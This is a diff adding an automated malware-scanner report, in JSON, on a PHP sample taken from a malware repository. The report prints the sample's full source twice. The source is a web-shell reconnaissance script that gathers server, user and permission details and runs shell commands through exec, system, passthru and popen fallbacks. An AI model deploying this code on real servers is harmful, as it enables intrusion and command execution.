@@ -1,0 +1,81 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "exec": "May run an executable file or a system command using Excel 4 Macros",
+            "popen": "May run an executable file or a system command on a Mac",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "<?php\ncr(\"ID\",\"harie\".\"harie\");\n$P       = @getcwd();\n$IP      = @getenv(\"SERVER_ADDR\");\n$UID     = crshell1exec(\"id\");\n$P   = @getcwd();\n$IP  = @getenv(\"SERVER_ADDR\");\n$UID = crshell1exec(\"id\");\ncr(\"SAFE\",@safemode()?\"ON\":\"OFF\");\ncr(\"OS\",@PHP_OS);\ncr(\"UNAME\",@php_uname());\ncr(\"SERVER\",($IP)?$IP:\"-\");\ncr(\"USER\",@get_current_user());\ncr(\"UID\",($UID)?$UID:\"uid=\".@getmyuid().\" gid=\".@getmygid());\ncr(\"DIR\",$P);\ncr(\"PERM\",(@is_writable($P))?\"[W]\":\"[R]\");\ncr(\"HDD\",\"Used: \".hdd(\"used\").\" Free: \".hdd(\"free\").\" Total: \".hdd(\"total\"));\ncr(\"DISFUNC\",@getdisfunc());\nfunction cr($t,$c) { echo \"$t: \"; echo (is_array($c))?join(\" \",$c):$c; echo \"<br>\"; }\nfunction safemode() { return (@ini_get(\"safe_mode\") OR eregi(\"on\",@ini_get(\"safe_mode\")) ) ? TRUE : FALSE; }\nfunction getdisfunc() { $rez = explode(\",\",@ini_get(\"disable_functions\")); return (!empty($rez))?$rez:array(); }\nfunction enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }\nfunction crshell1exec($cmd) {\n  if (enabled(\"exec\")) { exec($cmd,$o); $rez = join(\"\\r\\n\",$o); }\n  elseif (enabled(\"shell_exec\")) { $rez = shell_exec($cmd); }\n  elseif (enabled(\"system\")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  \n  elseif (enabled(\"passthru\")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }\n  elseif (enabled(\"popen\") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }\n  else { $rez = \"Error!\"; }\n  return $rez;\n}\nfunction vsize($size) {\n  if (!is_numeric($size)) { return FALSE; }\n  else {\n    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 .\" GB\"; }\n    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 .\" MB\"; }\n    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 .\" KB\"; }\n    else { $size = $size . \" B\"; }\n    return $size;\n  }\n}\nfunction hdd($type) {\n  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;\n  $hddspace = array(\"total\" => vsize($T), \"free\"  => vsize($F), \"used\"  => vsize($U));\n  return $hddspace[$type];\n}\necho(\"harie\");echo(\"Ckrid2\");\necho(\"harie\");echo(\"Ckrid2\");\n?>"
+    },
+    "filename": "VirusShare_ef9bc489ea48019a62975fde8ca36e4a",
+    "filesize": 2269,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ef9bc489ea48019a62975fde8ca36e4a",
+        "sha1": "c588fef14c9e16a9b3d2548c2941eb26f6940f61",
+        "sha256": "bea9ee1b9d13b5284f07829afa9cd25fdf5c3779c4cecf3e9f1a04fcf92bc31d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "cr(\"ID\",\"harie\".\"harie\");",
+            "$P       = @getcwd();",
+            "$IP      = @getenv(\"SERVER_ADDR\");",
+            "$UID     = crshell1exec(\"id\");",
+            "$P   = @getcwd();",
+            "$IP  = @getenv(\"SERVER_ADDR\");",
+            "$UID = crshell1exec(\"id\");",
+            "cr(\"SAFE\",@safemode()?\"ON\":\"OFF\");",
+            "cr(\"OS\",@PHP_OS);",
+            "cr(\"UNAME\",@php_uname());",
+            "cr(\"SERVER\",($IP)?$IP:\"-\");",
+            "cr(\"USER\",@get_current_user());",
+            "cr(\"UID\",($UID)?$UID:\"uid=\".@getmyuid().\" gid=\".@getmygid());",
+            "cr(\"DIR\",$P);",
+            "cr(\"PERM\",(@is_writable($P))?\"[W]\":\"[R]\");",
+            "cr(\"HDD\",\"Used: \".hdd(\"used\").\" Free: \".hdd(\"free\").\" Total: \".hdd(\"total\"));",
+            "cr(\"DISFUNC\",@getdisfunc());",
+            "function cr($t,$c) { echo \"$t: \"; echo (is_array($c))?join(\" \",$c):$c; echo \"<br>\"; }",
+            "function safemode() { return (@ini_get(\"safe_mode\") OR eregi(\"on\",@ini_get(\"safe_mode\")) ) ? TRUE : FALSE; }",
+            "function getdisfunc() { $rez = explode(\",\",@ini_get(\"disable_functions\")); return (!empty($rez))?$rez:array(); }",
+            "function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }",
+            "function crshell1exec($cmd) {",
+            "  if (enabled(\"exec\")) { exec($cmd,$o); $rez = join(\"\\r\\n\",$o); }",
+            "  elseif (enabled(\"shell_exec\")) { $rez = shell_exec($cmd); }",
+            "  elseif (enabled(\"system\")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  ",
+            "  elseif (enabled(\"passthru\")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }",
+            "  elseif (enabled(\"popen\") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }",
+            "  else { $rez = \"Error!\"; }",
+            "  return $rez;",
+            "function vsize($size) {",
+            "  if (!is_numeric($size)) { return FALSE; }",
+            "  else {",
+            "    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 .\" GB\"; }",
+            "    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 .\" MB\"; }",
+            "    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 .\" KB\"; }",
+            "    else { $size = $size . \" B\"; }",
+            "    return $size;",
+            "function hdd($type) {",
+            "  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;",
+            "  $hddspace = array(\"total\" => vsize($T), \"free\"  => vsize($F), \"used\"  => vsize($U));",
+            "  return $hddspace[$type];",
+            "echo(\"harie\");echo(\"Ckrid2\");",
+            "echo(\"harie\");echo(\"Ckrid2\");"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.267475",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
